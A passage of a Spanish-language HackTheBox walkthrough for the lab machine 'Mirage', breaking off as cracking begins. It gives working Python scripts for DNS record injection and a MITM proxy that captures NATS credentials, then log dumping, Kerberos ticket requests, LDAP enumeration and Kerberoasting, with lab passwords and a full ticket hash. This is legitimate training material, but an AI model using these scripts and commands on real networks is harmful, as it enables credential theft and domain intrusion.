---
hidden: true
icon: flag
layout:
  width: default
  title:
    visible: true
  description:
    visible: false
  tableOfContents:
    visible: true
  outline:
    visible: true
  pagination:
    visible: true
  metadata:
    visible: true
---

# Mirage HackTheBox (Hard)

## Escaneo de puertos

```shell
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn <IP>
```

```shell
nmap -sCV -p<PORTS> <IP>
```

Info:

```
Starting Nmap 7.95 ( https://nmap.org ) at 2025-10-27 04:07 PDT
Nmap scan report for 10.10.11.78
Host is up (0.044s latency).

PORT      STATE SERVICE         VERSION
53/tcp    open  domain          Simple DNS Plus
88/tcp    open  kerberos-sec    Microsoft Windows Kerberos (server time: 2025-10-27 18:07:37Z)
111/tcp   open  rpcbind?
| rpcinfo: 
|   program version    port/proto  service
|   100003  2,3         2049/udp   nfs
|   100003  2,3         2049/udp6  nfs
|   100003  2,3,4       2049/tcp   nfs
|_  100003  2,3,4       2049/tcp6  nfs
135/tcp   open  msrpc           Microsoft Windows RPC
139/tcp   open  netbios-ssn     Microsoft Windows netbios-ssn
389/tcp   open  ldap            Microsoft Windows Active Directory LDAP (Domain: mirage.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:dc01.mirage.htb, DNS:mirage.htb, DNS:MIRAGE
| Not valid before: 2025-07-04T19:58:41
|_Not valid after:  2105-07-04T19:58:41
|_ssl-date: TLS randomness does not represent time
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http      Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap        Microsoft Windows Active Directory LDAP (Domain: mirage.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:dc01.mirage.htb, DNS:mirage.htb, DNS:MIRAGE
| Not valid before: 2025-07-04T19:58:41
|_Not valid after:  2105-07-04T19:58:41
|_ssl-date: TLS randomness does not represent time
2049/tcp  open  nfs             2-4 (RPC #100003)
3268/tcp  open  ldap            Microsoft Windows Active Directory LDAP (Domain: mirage.htb0., Site: Default-First-Site-Name)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:dc01.mirage.htb, DNS:mirage.htb, DNS:MIRAGE
| Not valid before: 2025-07-04T19:58:41
|_Not valid after:  2105-07-04T19:58:41
3269/tcp  open  ssl/ldap        Microsoft Windows Active Directory LDAP (Domain: mirage.htb0., Site: Default-First-Site-Name)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:dc01.mirage.htb, DNS:mirage.htb, DNS:MIRAGE
| Not valid before: 2025-07-04T19:58:41
|_Not valid after:  2105-07-04T19:58:41
4222/tcp  open  vrml-multi-use?
| fingerprint-strings: 
|   GenericLines: 
|     INFO 
{"server_id":"NDNXPIQW6IRVY5UQVX6O4RBRMV6C37ZQVLO7WKI6U5R5X4Y3RUDO75EL","server_name":"NDNXPIQW6IRVY5UQVX6O4RBRMV6C37ZQVLO7WKI6U5R5X4Y3RUDO75EL","version":"2
.11.3","proto":1,"git_commit":"a82cfda","go":"go1.24.2","host":"0.0.0.0","port":4222,"headers":true,"auth_required":true,"max_payload":1048576,"jetstream":tr
ue,"client_id":436,"client_ip":"10.10.14.182","xkey":"XDWI5OZZKTZ22WXIABU4LKMDCWYYOKZD3FLDNUTJQYSAUX27SLOTHOS2"} 
|     -ERR 'Authorization Violation'
|   GetRequest: 
|     INFO 
{"server_id":"NDNXPIQW6IRVY5UQVX6O4RBRMV6C37ZQVLO7WKI6U5R5X4Y3RUDO75EL","server_name":"NDNXPIQW6IRVY5UQVX6O4RBRMV6C37ZQVLO7WKI6U5R5X4Y3RUDO75EL","version":"2
.11.3","proto":1,"git_commit":"a82cfda","go":"go1.24.2","host":"0.0.0.0","port":4222,"headers":true,"auth_required":true,"max_payload":1048576,"jetstream":tr
ue,"client_id":437,"client_ip":"10.10.14.182","xkey":"XDWI5OZZKTZ22WXIABU4LKMDCWYYOKZD3FLDNUTJQYSAUX27SLOTHOS2"} 
|     -ERR 'Authorization Violation'
|   HTTPOptions: 
|     INFO 
{"server_id":"NDNXPIQW6IRVY5UQVX6O4RBRMV6C37ZQVLO7WKI6U5R5X4Y3RUDO75EL","server_name":"NDNXPIQW6IRVY5UQVX6O4RBRMV6C37ZQVLO7WKI6U5R5X4Y3RUDO75EL","version":"2
.11.3","proto":1,"git_commit":"a82cfda","go":"go1.24.2","host":"0.0.0.0","port":4222,"headers":true,"auth_required":true,"max_payload":1048576,"jetstream":tr
ue,"client_id":438,"client_ip":"10.10.14.182","xkey":"XDWI5OZZKTZ22WXIABU4LKMDCWYYOKZD3FLDNUTJQYSAUX27SLOTHOS2"} 
|     -ERR 'Authorization Violation'
|   NULL: 
|     INFO 
{"server_id":"NDNXPIQW6IRVY5UQVX6O4RBRMV6C37ZQVLO7WKI6U5R5X4Y3RUDO75EL","server_name":"NDNXPIQW6IRVY5UQVX6O4RBRMV6C37ZQVLO7WKI6U5R5X4Y3RUDO75EL","version":"2
.11.3","proto":1,"git_commit":"a82cfda","go":"go1.24.2","host":"0.0.0.0","port":4222,"headers":true,"auth_required":true,"max_payload":1048576,"jetstream":tr
ue,"client_id":435,"client_ip":"10.10.14.182","xkey":"XDWI5OZZKTZ22WXIABU4LKMDCWYYOKZD3FLDNUTJQYSAUX27SLOTHOS2"} 
|_    -ERR 'Authentication Timeout'
5985/tcp  open  http            Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
9389/tcp  open  mc-nmf          .NET Message Framing
47001/tcp open  http            Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc           Microsoft Windows RPC
49665/tcp open  msrpc           Microsoft Windows RPC
49666/tcp open  msrpc           Microsoft Windows RPC
49667/tcp open  msrpc           Microsoft Windows RPC
49668/tcp open  msrpc           Microsoft Windows RPC
49963/tcp open  msrpc           Microsoft Windows RPC
49974/tcp open  ncacn_http      Microsoft Windows RPC over HTTP 1.0
49975/tcp open  msrpc           Microsoft Windows RPC
49989/tcp open  msrpc           Microsoft Windows RPC
49994/tcp open  msrpc           Microsoft Windows RPC
50012/tcp open  msrpc           Microsoft Windows RPC
50028/tcp open  msrpc           Microsoft Windows RPC
63581/tcp open  msrpc           Microsoft Windows RPC
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at 
https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port4222-TCP:V=7.95%I=7%D=10/27%Time=68FF5275%P=x86_64-pc-linux-gnu%r(N
SF:ULL,1D1,"INFO\x20{\"server_id\":\"NDNXPIQW6IRVY5UQVX6O4RBRMV6C37ZQVLO7W
SF:KI6U5R5X4Y3RUDO75EL\",\"server_name\":\"NDNXPIQW6IRVY5UQVX6O4RBRMV6C37Z
SF:QVLO7WKI6U5R5X4Y3RUDO75EL\",\"version\":\"2\.11\.3\",\"proto\":1,\"git_
SF:commit\":\"a82cfda\",\"go\":\"go1\.24\.2\",\"host\":\"0\.0\.0\.0\",\"po
SF:rt\":4222,\"headers\":true,\"auth_required\":true,\"max_payload\":10485
SF:76,\"jetstream\":true,\"client_id\":435,\"client_ip\":\"10\.10\.14\.182
SF:\",\"xkey\":\"XDWI5OZZKTZ22WXIABU4LKMDCWYYOKZD3FLDNUTJQYSAUX27SLOTHOS2\
SF:"}\x20\r\n-ERR\x20'Authentication\x20Timeout'\r\n")%r(GenericLines,1D2,
SF:"INFO\x20{\"server_id\":\"NDNXPIQW6IRVY5UQVX6O4RBRMV6C37ZQVLO7WKI6U5R5X
SF:4Y3RUDO75EL\",\"server_name\":\"NDNXPIQW6IRVY5UQVX6O4RBRMV6C37ZQVLO7WKI
SF:6U5R5X4Y3RUDO75EL\",\"version\":\"2\.11\.3\",\"proto\":1,\"git_commit\"
SF::\"a82cfda\",\"go\":\"go1\.24\.2\",\"host\":\"0\.0\.0\.0\",\"port\":422
SF:2,\"headers\":true,\"auth_required\":true,\"max_payload\":1048576,\"jet
SF:stream\":true,\"client_id\":436,\"client_ip\":\"10\.10\.14\.182\",\"xke
SF:y\":\"XDWI5OZZKTZ22WXIABU4LKMDCWYYOKZD3FLDNUTJQYSAUX27SLOTHOS2\"}\x20\r
SF:\n-ERR\x20'Authorization\x20Violation'\r\n")%r(GetRequest,1D2,"INFO\x20
SF:{\"server_id\":\"NDNXPIQW6IRVY5UQVX6O4RBRMV6C37ZQVLO7WKI6U5R5X4Y3RUDO75
SF:EL\",\"server_name\":\"NDNXPIQW6IRVY5UQVX6O4RBRMV6C37ZQVLO7WKI6U5R5X4Y3
SF:RUDO75EL\",\"version\":\"2\.11\.3\",\"proto\":1,\"git_commit\":\"a82cfd
SF:a\",\"go\":\"go1\.24\.2\",\"host\":\"0\.0\.0\.0\",\"port\":4222,\"heade
SF:rs\":true,\"auth_required\":true,\"max_payload\":1048576,\"jetstream\":
SF:true,\"client_id\":437,\"client_ip\":\"10\.10\.14\.182\",\"xkey\":\"XDW
SF:I5OZZKTZ22WXIABU4LKMDCWYYOKZD3FLDNUTJQYSAUX27SLOTHOS2\"}\x20\r\n-ERR\x2
SF:0'Authorization\x20Violation'\r\n")%r(HTTPOptions,1D2,"INFO\x20{\"serve
SF:r_id\":\"NDNXPIQW6IRVY5UQVX6O4RBRMV6C37ZQVLO7WKI6U5R5X4Y3RUDO75EL\",\"s
SF:erver_name\":\"NDNXPIQW6IRVY5UQVX6O4RBRMV6C37ZQVLO7WKI6U5R5X4Y3RUDO75EL
SF:\",\"version\":\"2\.11\.3\",\"proto\":1,\"git_commit\":\"a82cfda\",\"go
SF:\":\"go1\.24\.2\",\"host\":\"0\.0\.0\.0\",\"port\":4222,\"headers\":tru
SF:e,\"auth_required\":true,\"max_payload\":1048576,\"jetstream\":true,\"c
SF:lient_id\":438,\"client_ip\":\"10\.10\.14\.182\",\"xkey\":\"XDWI5OZZKTZ
SF:22WXIABU4LKMDCWYYOKZD3FLDNUTJQYSAUX27SLOTHOS2\"}\x20\r\n-ERR\x20'Author
SF:ization\x20Violation'\r\n");
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
|_clock-skew: 6h59m59s
| smb2-time: 
|   date: 2025-10-27T18:08:42
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 81.77 seconds
```

Veremos varias cosas interesantes y puertos interesantes, entre ellos el `LDAP, WinRM, SMB, etc...`, pero tambien veremos que hay un `dominio` llamado `mirage.htb` y un `DC` con un dominio de `AD` llamado `dc01.mirage.htb`, por lo que vamos añadirlo a nuestro archivo `hosts`.

```shell
nano /etc/hosts

#Dentro del nano
<IP>             mirage.htb dc01.mirage.htb
```

Lo guardamos y ahora probaremos a exfiltrar informacion del puerto `NFS (Network File System)` que pertenece al puerto `2049`, esto es muy interesante ya que con este puerto es un protocolo de sistema de archivos en red que permite montar directorios remotos como si fueran locales.

Vamos a montar dichos archivos con estos comandos:

```shell
showmount -e <IP_VICTIM>
```

Info:

```
Export list for 10.10.11.78:
/MirageReports (everyone)
```

Veremos que ha funcionado y vemos un `NFS` accesible por `everyone` llamado `MirageReports`, por lo que vamos a montarlo a nivel local.

```shell
sudo mkdir /mnt/mirage
sudo mount -t nfs <IP_VICTIM>:/MirageReports /mnt/mirage -o nolock
ls -la /mnt/mirage
```

Info:

```
total 17493
drwxrwxrwx+ 2 nobody nogroup      64 May 26 14:41 .
drwxr-xr-x  4 root   root       4096 Oct 27 04:44 ..
-rwx------+ 1 nobody nogroup 8530639 May 20 08:08 Incident_Report_Missing_DNS_Record_nats-svc.pdf
-rwx------+ 1 nobody nogroup 9373389 May 26 14:37 Mirage_Authentication_Hardening_Report.pdf
```

Veremos `2` archivos `PDF` bastante interesantes, si lo empezamos a investigar veremos informacion del `PDF` llamado `Incident_Report_Missing_DNS_Record_nats-svc.pdf` que veremos esta informacion bastante interesantes:

Ya que es un archivo respecto a un reporte de un incidente en la empresa, como cuando se realiza un `pentesting`.

<figure><img src="../../.gitbook/assets/Captura de pantalla 2025-10-27 125233.png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/Captura de pantalla 2025-10-27 125123.png" alt=""><figcaption></figcaption></figure>

Vemos que se esta utilizando un nuevo `dominio` creado a nivel `DNS` llamado `nats-svc`, tambien detectamos un usuario llamado `Dev_Account_A`, pero no existe registro `DNS` oficial para este servicio `nats-svc`, la vulnerabilidad de todo esto es que el sistema aceptará respuestas `DNS` no autenticadas.

## DNS Spoofing/DNS Poisoning

> Hipotesis Grafica (Vuln)

```
Cliente (Servidor) → Consulta DNS: "¿Dónde está nats-svc.mirage.htb?"
╰─────────────→ Tú (Atacante) respondes: "Está en TU_IP"
Cliente se conecta a TU_IP pensando que es el servicio real
```

Vamos añadir ese `dominio` a nuestro archivo `hosts`.

```shell
nano /etc/hosts

#Dentro del nano
<IP>             mirage.htb dc01.mirage.htb nats-svc.mirage.htb
```

Ahora podemos utilizar diversas herramientas para realizar este ataque, en mi caso utilizare un script en `python3` que primero envenenara los servidores `DNS` creando dicho `dominio` que vimos anteriormente `DNS` de la victima:

> spoofingDNS.py

```python
#!/usr/bin/env python3
import dns.update
import dns.query
import dns.resolver

# CONFIGURA ESTOS VALORES:
DNS_SERVER = '<IP_VICTIM>'
DOMAIN = 'mirage.htb.'
RECORD_NAME = 'nats-svc'
TU_IP = '<IP_ATTACKER>'

# Crear actualización DNS
update = dns.update.Update(DOMAIN)
update.add(RECORD_NAME, 300, 'A', TU_IP)  # 300 segundos de TTL

# Enviar la actualización
try:
    response = dns.query.tcp(update, DNS_SERVER)
    print(f"[+] DNS actualizado! nats-svc.mirage.htb -> {TU_IP}")
    print(f"Respuesta: {response}")
except Exception as e:
    print(f"[-] Error: {e}")
```

Ahora crearemos otro script que actue como `proxy MITM` para interceptar dicho trafico que pase por el mismo.

> proxyMITM.py

```python
#!/usr/bin/env python3
import socket
import threading

# CONFIGURACIÓN
LISTEN_HOST = '0.0.0.0'
LISTEN_PORT = 4222
REAL_NATS_SERVER = '<IP_VICTIM>'
REAL_NATS_PORT = 4222

def handle_client(client_sock):
    print(f"[+] Cliente conectado: {client_sock.getpeername()}")
    
    # Conectar al servidor NATS real
    remote_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        remote_sock.connect((REAL_NATS_SERVER, REAL_NATS_PORT))
        print(f"[+] Conectado al NATS real: {REAL_NATS_SERVER}:{REAL_NATS_PORT}")
    except Exception as e:
        print(f"[-] Error conectando a NATS real: {e}")
        client_sock.close()
        return

    # Función para forwardear tráfico Y MOSTRARLO
    def forward(src, dst, direction):
        while True:
            try:
                data = src.recv(4096)
                if not data:
                    break
                
                # MOSTRAR EL TRÁFICO (esto es lo importante)
                try:
                    print(f"\n[{direction}] {data.decode('utf-8', errors='ignore')}")
                except:
                    print(f"\n[{direction}] [DATOS BINARIOS] {data.hex()}")
                
                # Forwardear al destino
                dst.sendall(data)
            except Exception as e:
                break
        
        src.close()
        dst.close()

    # Dos hilos: cliente->servidor y servidor->cliente
    threading.Thread(target=forward, args=(client_sock, remote_sock, "CLIENT->SERVER"), daemon=True).start()
    threading.Thread(target=forward, args=(remote_sock, client_sock, "SERVER->CLIENT"), daemon=True).start()

def start_proxy():
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    server.bind((LISTEN_HOST, LISTEN_PORT))
    server.listen(5)
    
    print(f"[+] Proxy MITM escuchando en {LISTEN_HOST}:{LISTEN_PORT}")
    print(f"[+] Redirigiendo a {REAL_NATS_SERVER}:{REAL_NATS_PORT}")
    print("[+] Esperando conexiones...\n")
    
    while True:
        client_sock, addr = server.accept()
        threading.Thread(target=handle_client, args=(client_sock,), daemon=True).start()

if __name__ == "__main__":
    start_proxy()
```

Ahora vamos a ejecutarlo en este orden:

```shell
python3 spoofingDNS.py
```

Info:

```
[+] DNS actualizado! nats-svc.mirage.htb -> 10.10.14.182
Respuesta: id 25292
opcode UPDATE
rcode NOERROR
flags QR
;ZONE
mirage.htb. IN SOA
;PREREQ
;UPDATE
nats-svc.mirage.htb. 300 IN A 10.10.14.182
;ADDITIONAL
```

Con esto veremos que ha funcionado, se ha creado de forma correcta el `dominio` apuntando a nuestra `IP` atacante, ahora seguidamente ejecutaremos en otra terminal el segundo script para estar a la escucha de cualquier conexion que se realice en el `dominio`:

```shell
python3 proxyMITM.py
```

Info:

```
[+] Proxy MITM escuchando en 0.0.0.0:4222
[+] Redirigiendo a 10.10.11.78:4222
[+] Esperando conexiones...

[+] Cliente conectado: ('10.10.11.78', 51081)
[+] Conectado al NATS real: 10.10.11.78:4222

[SERVER->CLIENT] INFO {"server_id":"NDNXPIQW6IRVY5UQVX6O4RBRMV6C37ZQVLO7WKI6U5R5X4Y3RUDO75EL","server_name":"NDNXPIQW6IRVY5UQVX6O4RBRMV6C37ZQVLO7WKI6U5R5X4Y3RUDO75EL","version":"2.11.3","proto":1,"git_commit":"a82cfda","go":"go1.24.2","host":"0.0.0.0","port":4222,"headers":true,"auth_required":true,"max_payload":1048576,"jetstream":true,"client_id":541,"client_ip":"10.10.14.182","xkey":"XDWI5OZZKTZ22WXIABU4LKMDCWYYOKZD3FLDNUTJQYSAUX27SLOTHOS2"} 


[CLIENT->SERVER] CONNECT {"verbose":false,"pedantic":false,"user":"Dev_Account_A","pass":"hx5h7F5554fP@1337!","tls_required":false,"name":"NATS CLI Version 0.2.2","lang":"go","version":"1.41.1","protocol":1,"echo":true,"headers":true,"no_responders":true}


[CLIENT->SERVER] PING


[SERVER->CLIENT] PONG


[CLIENT->SERVER] PING


[SERVER->CLIENT] PONG
```

Veremos que ha funcionado y obtendremos unas credenciales:

```
User: Dev_Account_A
Pass: hx5h7F5554fP@1337!
```

Ha funcionado la autenticacion hacia nosotros con dichas credenciales, por lo que una vez teniendo estas credenciales vamos a intentar obtener toda la informacion que podamos mediante el puerto `NATS` con una herramienta de `GitHub`.

## Exfiltrar informacion por NATS (Auth)

```shell
wget https://github.com/nats-io/natscli/releases/download/v0.2.2/nats-0.2.2-linux-amd64.zip
unzip nats-0.2.2-linux-amd64.zip
sudo mv nats-0.2.2-linux-amd64/nats /usr/local/bin/
```

Una vez descargado la herramienta, vamos a utilizarla utilizando las credenciales obtenidas de esta forma para intentar obtener informacion mediante `NATS` de los `logs` de autenticacion.

```shell
nats -s 'nats://Dev_Account_A:hx5h7F5554fP@1337!@10.10.11.78:4222' stream info auth_logs
```

Info:

```
Information for Stream auth_logs created 2025-05-05 00:18:19

                Subjects: logs.auth
                Replicas: 1
                 Storage: File

Options:

               Retention: Limits
         Acknowledgments: true
          Discard Policy: New
        Duplicate Window: 2m0s
              Direct Get: true
       Allows Msg Delete: false
            Allows Purge: false
  Allows Per-Message TTL: false
          Allows Rollups: false

Limits:

        Maximum Messages: 100
     Maximum Per Subject: unlimited
           Maximum Bytes: 1.0 MiB
             Maximum Age: unlimited
    Maximum Message Size: unlimited
       Maximum Consumers: unlimited

State:

            Host Version: 2.11.3
      Required API Level: 0 hosted at level 1
                Messages: 5
                   Bytes: 570 B
          First Sequence: 1 @ 2025-05-05 00:18:56
           Last Sequence: 5 @ 2025-05-05 00:19:27
        Active Consumers: 0
      Number of Subjects: 1
```

No veremos nada interesante, pero sabemos que funciona, por lo que vamos a tirar por aqui, vamos a probar en vez de sacar la info, a visualizar los `auth_logs` de esta forma:

```shell
nats -s 'nats://Dev_Account_A:hx5h7F5554fP@1337!@10.10.11.78:4222' stream view auth_logs --raw
```

Info:

```
{"user":"david.jjackson","password":"pN8kQmn6b86!1234@","ip":"10.10.10.20"}
{"user":"david.jjackson","password":"pN8kQmn6b86!1234@","ip":"10.10.10.20"}
{"user":"david.jjackson","password":"pN8kQmn6b86!1234@","ip":"10.10.10.20"}
{"user":"david.jjackson","password":"pN8kQmn6b86!1234@","ip":"10.10.10.20"}
{"user":"david.jjackson","password":"pN8kQmn6b86!1234@","ip":"10.10.10.20"}
05:31:32 Reached apparent end of data
```

Vemos algo muy interesante y es que se autentico varias veces el usuario `david.jjackson` con el muestra la contraseña en texto plano, vamos a obtener el `TGT` de dicho usuario para utilizar la autenticacion mediante `kerberos`.

## Obtener TGT david.jjackson

```shell
ntpdate mirage.htb ; impacket-getTGT mirage.htb/'david.jjackson':'pN8kQmn6b86!1234@'
```

Info:

```
2025-10-27 12:39:35.948378 (-0700) +25200.245027 +/- 0.016795 mirage.htb 10.10.11.78 s1 no-leap
CLOCK: time stepped by 25200.245027
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Saving ticket in david.jjackson.ccache
```

Ahora vamos a exportarlo en la variable de `kerberos`.

```shell
export KRB5CCNAME=david.jjackson.ccache
```

Ahora vamos a probar a enumerar los usuarios por `LDAP` de esta forma:

```shell
netexec ldap <IP> -u david.jjackson -p 'pN8kQmn6b86!1234@' -k --users
```

Info:

```
LDAP        10.10.11.78     389    DC01             [*] None (name:DC01) (domain:mirage.htb)
LDAP        10.10.11.78     389    DC01             [+] mirage.htb\david.jjackson:pN8kQmn6b86!1234@ 
LDAP        10.10.11.78     389    DC01             [*] Enumerated 10 domain users: mirage.htb
LDAP        10.10.11.78     389    DC01             -Username-                    -Last PW Set-       -BadPW-  -Description-                                 
LDAP        10.10.11.78     389    DC01             Administrator                 2025-06-23 14:18:18 0        Built-in account for administering the computer/domain                                                                                                                                                     
LDAP        10.10.11.78     389    DC01             Guest                         <never>             0        Built-in account for guest access to the computer/domain                                                                                                                                                   
LDAP        10.10.11.78     389    DC01             krbtgt                        2025-05-01 00:42:23 0        Key Distribution Center Service Account       
LDAP        10.10.11.78     389    DC01             Dev_Account_A                 2025-05-27 07:05:12 0                                                      
LDAP        10.10.11.78     389    DC01             Dev_Account_B                 2025-05-02 01:28:11 1                                                      
LDAP        10.10.11.78     389    DC01             david.jjackson                2025-05-02 01:29:50 0                                                      
LDAP        10.10.11.78     389    DC01             javier.mmarshall              2025-05-25 11:44:43 0        Contoso Contractors                           
LDAP        10.10.11.78     389    DC01             mark.bbond                    2025-06-23 14:18:18 0                                                      
LDAP        10.10.11.78     389    DC01             nathan.aadam                  2025-06-23 14:18:18 0                                                      
LDAP        10.10.11.78     389    DC01             svc_mirage                    2025-05-22 13:37:45 0        Old service account migrated by contractors
```

Vemos varios usuarios interesantes, por lo que vamos a probar a ver si algun usuario fuera vulnerable a `kerberoasting` utilizando esta herramienta:

## Escalate user nathan.aadam

### Kerberoasting user nathan.aadam

```shell
impacket-GetUserSPNs 'mirage.htb/david.jjackson:pN8kQmn6b86!1234@' -dc-ip <IP> -dc-host dc01.mirage.htb -k -request
```

Info:

```
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

ServicePrincipalName      Name          MemberOf                                                             PasswordLastSet             LastLogon                   Delegation 
------------------------  ------------  -------------------------------------------------------------------  --------------------------  --------------------------  ----------
HTTP/exchange.mirage.htb  nathan.aadam  CN=Exchange_Admins,OU=Groups,OU=Admins,OU=IT_Staff,DC=mirage,DC=htb  2025-06-23 14:18:18.584667  2025-07-04 13:01:43.511763             



$krb5tgs$23$*nathan.aadam$MIRAGE.HTB$mirage.htb/nathan.aadam*$283e7a5501aad6624087556eda34151d$1932e0adb09356a541e8d0870f50498ac6e14a7193c505afc718263a2cec3486a160cda181c553ee1d16ba72c4917804b074a93a97d3f0803a0c4ed57587a6f4d604c08f888f77c6cc98a8577e8cb568e859b1211676e264ee0b85ff7e968e36d6bd94d317f5e76eb565189f1ed20b2263fb70715138d4bc09d058f09e4ebbc35b1738aa2508f665ee72a363b736e4ed0339e440ed942af773b69734e0f628d56d57374c7f2aef0fbe529e5e8c9d3ecb364f95ea26d73bd4e739a38510abd2707ad7fde5a57d3dd2cd08783465ae20d9bd1f7b0dad7fc8286d9130908aada7a1beefefacb7e38041c08b49406e683397e889c3706df3c6c93b684d4e4c5c4008084d0d0ae5071d2a7f29f9aa244db44f384ab0d98dc25741ef4403b4c06aceb7d074f84f05117297200268afcceb0e48c1bc9b0e53762a543938a1c485f8d88f5c6304971b835153b92cd61ef6cc6d227779245fd31dc2fb61c8c90b117e1495192889ebbd9fb479c5cb9d8d214974fd233f783e7c300612bcf10cea5471c5a6a931cd9d0f75be774e9e854d6696bc4e9ed934637dd5ad689f33ec9656fe3248acc0367750cd552e3c4daaa8b04e87bef93271d95e57dc971a952f44392e69199acc7b08827dc64c8997ee982ab95329a393bc8e90c6df3457cba40b2a3a3444eb9da8058255894fb3d337ddcd9e868af585f031e2661d686d16e06a6e6a01e9b151cff3b56a177de2681ab608447596cdfac167aa03eaee7fb04848c2c91805a1e4924373b9957b6a1624d6e56ab31a78c76af4068044c0fa466efa85ac060f334799316dd9e6d4e37d7241bdff73da449f180b7bccbbc4ce626caeb05cfc1c32447b2bb7f98c4a38cc8d3b01a85a80b91fdccc35248e1d6fdc8dd0604a759197c427b34429e297d809552f01d0012d66abcf306c97fbd3e6a64cb0bc59c756f34bff1885fc50e20f1455816c1472a367e14ee74724358a9cf8b141d1393ffc8d92ec28c317f1a4f349ae955083acfc2894ec72c9bdea50ebe99658f26c343b1116aed3644b9bae828c1561d5a56eeea8a1549dbd4f7fc1e479f7c7c6ff06f91e965a1aa8cec03a5700cc6af82f546ce532af7edb61f339cb8087ea3519e1395b05552a90482d33a7ece2781f4788f5d207eb21e2e10700dfb19282033f87b1f00cc3113f3ba8e95cee503658a52230e4c73fdf944be2912bbf8192a02f1312cfbcfc3ce9213f751b5378d4a9fa90109fcdf693102a3ca82f625039c3dec6de66a3d7737cda36e795ac1c94229fe519e030a1e5704b4b4236aa995f2b681439008ff9d2121dd86b7a02f3719c68cf1d51cb72cf0a4ccaa050e348aeae36926af88f281985258af9749847fbce1dc57ac7ca54726fbeffdbd916ea7d76140e4691e9955a644fa642911d14964c8b661d52e17d7e0eabf7f0cd428295235269e09549c24cbf1dfad9e40411b813d88e86424e483511b6bcbe8a4cc9f94b344ce82b4d8b5b37ba06c3527b8545d7fab9ef7bfcadf737b02281aacd5da9c51ec9737e2dba378c96b21c77c10f99b374526ff531a8916e49ef83ed
```

Veremos que hemos conseguido el `hash` de un usuario llamado `nathan.aadam` gracias a que es vulnerable a `kerberoasting`, por lo que vamos a probar a `crackearlo` de esta forma:

> hash.nathan.aadam

```
$krb5tgs$23$*nathan.aadam$MIRAGE.HTB$mirage.htb/nathan.aadam*$283e7a5501aad6624087556eda34151d$1932e0adb09356a541e8d0870f50498ac6e14a7193c505afc718263a2cec3486a160cda181c553ee1d16ba72c4917804b074a93a97d3f0803a0c4ed57587a6f4d604c08f888f77c6cc98a8577e8cb568e859b1211676e264ee0b85ff7e968e36d6bd94d317f5e76eb565189f1ed20b2263fb70715138d4bc09d058f09e4ebbc35b1738aa2508f665ee72a363b736e4ed0339e440ed942af773b69734e0f628d56d57374c7f2aef0fbe529e5e8c9d3ecb364f95ea26d73bd4e739a38510abd2707ad7fde5a57d3dd2cd08783465ae20d9bd1f7b0dad7fc8286d9130908aada7a1beefefacb7e38041c08b49406e683397e889c3706df3c6c93b684d4e4c5c4008084d0d0ae5071d2a7f29f9aa244db44f384ab0d98dc25741ef4403b4c06aceb7d074f84f05117297200268afcceb0e48c1bc9b0e53762a543938a1c485f8d88f5c6304971b835153b92cd61ef6cc6d227779245fd31dc2fb61c8c90b117e1495192889ebbd9fb479c5cb9d8d214974fd233f783e7c300612bcf10cea5471c5a6a931cd9d0f75be774e9e854d6696bc4e9ed934637dd5ad689f33ec9656fe3248acc0367750cd552e3c4daaa8b04e87bef93271d95e57dc971a952f44392e69199acc7b08827dc64c8997ee982ab95329a393bc8e90c6df3457cba40b2a3a3444eb9da8058255894fb3d337ddcd9e868af585f031e2661d686d16e06a6e6a01e9b151cff3b56a177de2681ab608447596cdfac167aa03eaee7fb04848c2c91805a1e4924373b9957b6a1624d6e56ab31a78c76af4068044c0fa466efa85ac060f334799316dd9e6d4e37d7241bdff73da449f180b7bccbbc4ce626caeb05cfc1c32447b2bb7f98c4a38cc8d3b01a85a80b91fdccc35248e1d6fdc8dd0604a759197c427b34429e297d809552f01d0012d66abcf306c97fbd3e6a64cb0bc59c756f34bff1885fc50e20f1455816c1472a367e14ee74724358a9cf8b141d1393ffc8d92ec28c317f1a4f349ae955083acfc2894ec72c9bdea50ebe99658f26c343b1116aed3644b9bae828c1561d5a56eeea8a1549dbd4f7fc1e479f7c7c6ff06f91e965a1aa8cec03a5700cc6af82f546ce532af7edb61f339cb8087ea3519e1395b05552a90482d33a7ece2781f4788f5d207eb21e2e10700dfb19282033f87b1f00cc3113f3ba8e95cee503658a52230e4c73fdf944be2912bbf8192a02f1312cfbcfc3ce9213f751b5378d4a9fa90109fcdf693102a3ca82f625039c3dec6de66a3d7737cda36e795ac1c94229fe519e030a1e5704b4b4236aa995f2b681439008ff9d2121dd86b7a02f3719c68cf1d51cb72cf0a4ccaa050e348aeae36926af88f281985258af9749847fbce1dc57ac7ca54726fbeffdbd916ea7d76140e4691e9955a644fa642911d14964c8b661d52e17d7e0eabf7f0cd428295235269e09549c24cbf1dfad9e40411b813d88e86424e483511b6bcbe8a4cc9f94b344ce82b4d8b5b37ba06c3527b8545d7fab9ef7bfcadf737b02281aacd5da9c51ec9737e2dba378c96b21c77c10f99b374526ff531a8916e49ef83ed
```

Ahora vamos a `crackearlo`...

```shell
